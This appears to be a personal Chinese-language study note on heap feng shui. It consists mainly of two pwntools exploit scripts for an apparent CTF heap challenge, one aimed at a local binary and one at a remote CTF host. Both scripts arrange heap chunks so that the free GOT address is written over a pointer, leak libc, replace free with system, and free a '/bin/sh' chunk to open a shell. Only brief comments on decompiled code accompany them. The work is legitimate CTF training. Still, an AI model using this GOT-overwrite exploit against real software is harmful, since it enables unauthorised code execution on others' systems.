TITLE 堆风水
DATA 2026-07-03
SUMMARY 堆风水漏洞利用相关的东西
TAG heap,ROP,漏洞利用

![[Pasted image 20260630155845.png]]

- 这里先释放了chunk2指向的chunk1，然后再释放了chunk2
- \*(void \*\*)\*(&ptr+a1) 的意思是对地址解引用两次


![[Pasted image 20260630162322.png]]

- ptr是全局数组首地址，作用是存放所有用户自定义堆的堆指针





```python
from pwn import*
context.log_level  = "debug"
elf = ELF('./a')
libc = ELF('/lib/i386-linux-gnu/libc.so.6')
#io = remote('node4.buuoj.cn',26247)
io = process('./a')

def add(size,name,length,text):
	io.recvuntil(b'Action: ')
	io.sendline(b'0')
	io.recvuntil(b'size of description: ')
	io.sendline(str(size))
	io.recvuntil(b'name: ')
	io.sendline(name)
	io.recvuntil(b'text length: ')
	io.sendline(str(length))
	io.recvuntil(b'text: ')
	io.sendline(text)
def delete(id):
	io.recvuntil(b'Action: ')
	io.sendline(b'1')
	io.recvuntil(b'index: ')
	io.sendline(str(id))
def show(id):
	io.recvuntil(b'Action: ')
	io.sendline(b'2')
	io.recvuntil(b'index: ')
	io.sendline(str(id))
def update(id,length,text):
	io.recvuntil(b'Action: ')
	io.sendline(b'3')
	io.recvuntil(b'index: ')
	io.sendline(str(id))
	io.recvuntil(b'text length: ')
	io.sendline(str(length))
	io.recvuntil(b'text: ')
	io.sendline(text)

add(0x80,b'nam1',0x80,b'aaaa')
add(0x80,b'nam2',0x80,b'bbbb')
add(0x80,b'nam3',0x80,b'/bin/sh\x00')
delete(0)
add(0x100,b'name1',0x100,b'cccc') # 申请新的 chunk id为3
free_got = elf.got['free'] 
payload = b'a'*0x108 + b'a'*8 + b'a'*0x80 + b'a'*8 + p32(free_got)
update(3,0x200,payload) # 在 name thunk1 里面写入 free_got 地址
show(1) # 输出地址
io.recvuntil(b'description: ')
free_addr = u32(io.recv(4)) # 接收free_got的地址
libc_base = free_addr - libc.sym['free'] # 计算libc基址
system = libc_base + libc.sym['system'] # 算出system地址
print(hex(system))

update(1,0x80,p32(system)) # 写入system地址
delete(2)
#gdb.attach(io)
#pause()
io.interactive()
```


```python
#coding=utf-8
from pwn import *

#io = process("./pwn")
io = remote("db9192e9341c2352b5ebf10f.tcp-ctf2.dasctf.com", 9999, ssl=True)
e = ELF("./a")
libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
context.log_level = "debug"
#context.terminal = ["/usr/bin/tmux", "splitw", "-h", "-p", "70"]

def debug():
    gdb.attach(io)

def add_user(description_size, name, text_len, text):
    io.recvuntil("Action: ")
    io.sendline("0")
    io.recvuntil("size of description: ")
    io.sendline(str(description_size))
    io.recvuntil("name: ")
    io.sendline(name)
    io.recvuntil("text length: ")
    io.sendline(str(text_len))
    io.recvuntil("text: ")
    io.sendline(text)

def delete_user(index):
    io.recvuntil("Action: ")
    io.sendline("1")
    io.recvuntil("index: ")
    io.sendline(str(index))

def display(index):
    io.recvuntil("Action: ")
    io.sendline("2")
    io.recvuntil("index: ")
    io.sendline(str(index))

def update(index, text_len, text):
    io.recvuntil("Action: ")
    io.sendline("3")
    io.recvuntil("index: ")
    io.sendline(str(index))
    io.recvuntil("text length: ")
    io.sendline(str(text_len))
    io.recvuntil("text: ")
    io.sendline(text)

add_user(0x10, "aaa", 0x10, "bbb") #index0
add_user(0x10, "aaa", 0x10, "bbb") #index1
add_user(0x10, "aaa", 0x10, "/bin/sh\x00") #index2
delete_user(0)

free_got = e.got["free"]
payload = 128*b"a" + p32(0x0) + p32(0x19) + b"\x00"*20 + p32(0x89) + p32(free_got)
add_user(0x80, b"aaa", len(payload), payload) #index3

# leak libc
display(1)
io.recvuntil("description: ")
free_addr = u32(io.recv(4))
#libc_addr = free_addr - libc.symbols["free"]
libc_addr = free_addr - 0x00070750
print("func address: " + hex(free_addr))
print("libc address: " + hex(libc_addr))

#get shell
#system_addr = libc_addr + libc.symbols["system"]
system_addr = libc_addr + 0x03a940
payload = p32(system_addr)
update(1, len(payload), payload)

delete_user(2)

io.interactive()

```